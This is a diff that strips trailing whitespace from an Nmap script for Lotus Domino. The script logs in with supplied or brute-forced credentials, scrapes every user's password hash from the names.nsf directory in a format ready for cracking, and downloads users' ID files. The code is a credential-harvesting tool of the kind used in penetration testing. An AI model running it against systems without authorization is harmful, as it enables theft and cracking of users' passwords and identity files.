@@ -18,7 +18,7 @@ also download any Domino ID Files attached to the Person document.
 -- This script attempts to enumerate the password hashes used to authenitcate
 -- to the Lotus Domino Web interface. By default, these hashes are accessible
 -- to every authenticated user. Passwords are presented in a form suitable for
--- running in John the Ripper. 
+-- running in John the Ripper.
 --
 -- The format can in two forms (http://comments.gmane.org/gmane.comp.security.openwall.john.user/785):
 -- 1. Saltless (legacy support?)
@@ -33,13 +33,13 @@ also download any Domino ID Files attached to the Person document.
 --
 -- It appears as if form based authentication is enabled, basic authentication
 -- still works. Therefore the script should work in both scenarios. Valid
--- credentials can either be supplied directly using the parameters username 
+-- credentials can either be supplied directly using the parameters username
 -- and password or indirectly from results of http-brute or http-form-brute.
 --
 -- @output
 -- PORT     STATE SERVICE REASON
 -- 80/tcp   open  http    syn-ack
--- | domino-enum-passwords:  
+-- | domino-enum-passwords:
 -- |   Information
 -- |     Information retrieved as: "Jim Brass"
 -- |   Internet hashes (salted, jtr: --format=DOMINOSEC)
@@ -67,7 +67,7 @@ also download any Domino ID Files attached to the Person document.
 -- |      Wendy Simms ID File has been downloaded (/tmp/id/Wendy Simms.id)
 -- |      Nick Stokes ID File has been downloaded (/tmp/id/Nick Stokes.id)
 -- |      Catherine Willows ID File has been downloaded (/tmp/id/Catherine Willows.id)
--- |   
+-- |
 -- |_  Results limited to 10 results (see domino-enum-passwords.count)
 --
 --
@@ -102,7 +102,7 @@ portrule = shortport.port_or_service({80, 443}, {"http","https"}, "tcp", "open")
 -- @param path against which to check if authentication is required
 local function requiresAuth( host, port, path )
 	local result = http.get(host, port, "/names.nsf")
-	
+
 	if ( result.status == 401 ) then
 		return true
 	elseif ( result.status == 200 and result.body and result.body:match("<input.-type=[\"]*password[\"]*") ) then
@@ -124,7 +124,7 @@ local function isValidCredential( host, port, path, user, pass )
 	-- we need to supply the no_cache directive, or else the http library
 	-- incorrectly tells us that the authentication was successfull
 	local result = http.get( host, port, path, { auth = { username = user, password = pass }, no_cache = true })
-	
+
 	if ( result.status == 401 ) then
 		return false
 	end
@@ -141,7 +141,7 @@ local function getLinks( body, filter, links )
 	local tmp = {}
 	local links = links or {}
 	local filter = filter or ".*"
-	
+
 	if ( not(body) ) then return end
 	for _, v in ipairs( links ) do
 		tmp[v] = true
@@ -158,7 +158,7 @@ local function getLinks( body, filter, links )
 	for k, _ in pairs(tmp) do
  		table.insert(links, k)
 	end
-	
+
 	return links
 end
 
@@ -182,7 +182,7 @@ local function getUserDetails( body )
 	local http_passwd = body:match("<input name=\"HTTPPassword\".-value=\"(.-)\">")
 	local dsp_http_passwd = body:match("<input name=\"dspHTTPPassword\".-value=\"(.-)\">")
 	local id_file = body:match("<a href=\"(.-UserID)\">")
-	
+
 	-- Remove the parenthesis around the password
 	http_passwd = http_passwd:sub(2,-2)
 	-- In case we have more than one full name, return only the last
@@ -195,7 +195,7 @@ end
 --- Saves the ID file to disk
 --
 -- @param filename string containing the name and full path to the file
--- @param data contains the data 
+-- @param data contains the data
 -- @return status true on success, false on failure
 -- @return err string containing error message if status is false
 local function saveIDFile( filename, data )
@@ -224,17 +224,17 @@ action = function(host, port)
 	local chunk_size = 30
 	local max_fetch = stdnse.get_script_args('domino-enum-passwords.count') and tonumber(stdnse.get_script_args('domino-enum-passwords.count')) or 10
 	local http_response
-	
+
 	if ( nmap.registry['credentials'] and nmap.registry['credentials']['http'] ) then
 		creds = nmap.registry['credentials']['http']
 	end
-	
+
 	-- authentication required?
 	if ( requiresAuth( vhost or host, port, path ) ) then
 		if ( not(user) and not(creds) ) then
 			return "  \n  ERROR: No credentials supplied (see domino-enum-passwords.username and domino-enum-passwords.password)"
 		end
-		
+
 		-- A user was provided, attempt to authenticate
 		if ( user ) then
 			if (not(isValidCredential( vhost or host, port, path, user, pass )) ) then
@@ -250,7 +250,7 @@ action = function(host, port)
 			end
 		end
 	end
-	
+
 	if ( not(user) and not(pass) ) then
 		return "  \n  ERROR: No valid credentials were found (see domino-enum-passwords.username and domino-enum-passwords.password)"
 	end
@@ -259,7 +259,7 @@ action = function(host, port)
 	http_response = http.get( vhost or host, port, path, { auth = { username = user, password = pass }, no_cache = true })
 	pager = getPager( http_response.body )
 	if ( not(pager) ) then
-		if ( http_response.body and 
+		if ( http_response.body and
 			 http_response.body:match(".*<input type=\"submit\".* value=\"Sign In\">.*" ) ) then
 			return "  \n  ERROR: Failed to authenticate"
 		else
@@ -267,11 +267,11 @@ action = function(host, port)
 		end
 	end
 	pos = 1
-	
+
 	-- first collect all links
 	while( true ) do
 		path = pager .. "&Start=" .. pos
-		http_response = http.get( vhost or host, port, path, { auth = { username = user, password = pass }, no_cache = true })	
+		http_response = http.get( vhost or host, port, path, { auth = { username = user, password = pass }, no_cache = true })
 
 		if ( http_response.status == 200 ) then
 			local size = #links
@@ -285,13 +285,13 @@ action = function(host, port)
 		if ( max_fetch > 0 and max_fetch < #links ) then
 			break
 		end
-		
+
 		pos = pos + chunk_size
 	end
-	
+
 	for _, link in ipairs(links) do
 		stdnse.print_debug(2, "Fetching link: %s", link)
-		http_response = http.get( vhost or host, port, link, { auth = { username = user, password = pass }, no_cache = true })	
+		http_response = http.get( vhost or host, port, link, { auth = { username = user, password = pass }, no_cache = true })
 		local u_details = getUserDetails( http_response.body )
 
 		if ( max_fetch > 0 and (#hashes+#legacyHashes)>= max_fetch ) then
@@ -307,12 +307,12 @@ action = function(host, port)
 				table.insert( hashes, ("%s:(%s)"):format(u_details.fullname, u_details.passwd))
 			end
 		end
-		
+
 		if ( u_details.idfile ) then
 			stdnse.print_debug(2, "Found ID file for user: %s", u_details.fullname)
 			if ( download_path ) then
 				stdnse.print_debug(2, "Downloading ID file for user: %s", u_details.full_name)
-				http_response = http.get( vhost or host, port, u_details.idfile, { auth = { username = user, password = pass }, no_cache = true })	
+				http_response = http.get( vhost or host, port, u_details.idfile, { auth = { username = user, password = pass }, no_cache = true })
 
 				if ( http_response.status == 200 ) then
 					local filename = download_path .. "/" .. stdnse.filename_escape(u_details.fullname .. ".id")
@@ -330,11 +330,11 @@ action = function(host, port)
 			end
 		end
 	end
-	
+
 	if( #hashes + #legacyHashes > 0) then
 		table.insert( result, { name = "Information", [1] = ("Information retrieved as: \"%s\""):format(user) } )
 	end
-	
+
 	if ( #hashes ) then
 		hashes.name = "Internet hashes (salted, jtr: --format=DOMINOSEC)"
 		table.insert( result, hashes )
@@ -348,13 +348,13 @@ action = function(host, port)
 		id_files.name = "ID Files"
 		table.insert( result, id_files )
 	end
-	
+
 	local result = stdnse.format_output(true, result)
-	
+
 	if ( max_fetch > 0 ) then
 		result = result .. ("  \n  Results limited to %d results (see domino-enum-passwords.count)"):format(max_fetch)
 	end
-	
+
 	return result
-	
+
 end
